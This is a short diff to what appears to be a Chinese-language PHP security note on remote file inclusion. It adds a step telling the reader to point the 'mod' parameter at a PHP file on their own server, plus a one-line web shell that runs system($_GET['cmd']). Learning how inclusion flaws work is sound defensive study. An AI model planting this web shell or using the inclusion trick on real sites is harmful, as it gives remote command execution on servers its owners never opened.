@@ -564,7 +564,11 @@ foo.php代码
 $modname = $_GET['mod'];
 inclide($modname);
 
+讲mod改成自己的服务器的php文件,代码
 
+```php
+<? system($_GET['cmd'])?>
+```
 ```
 
 
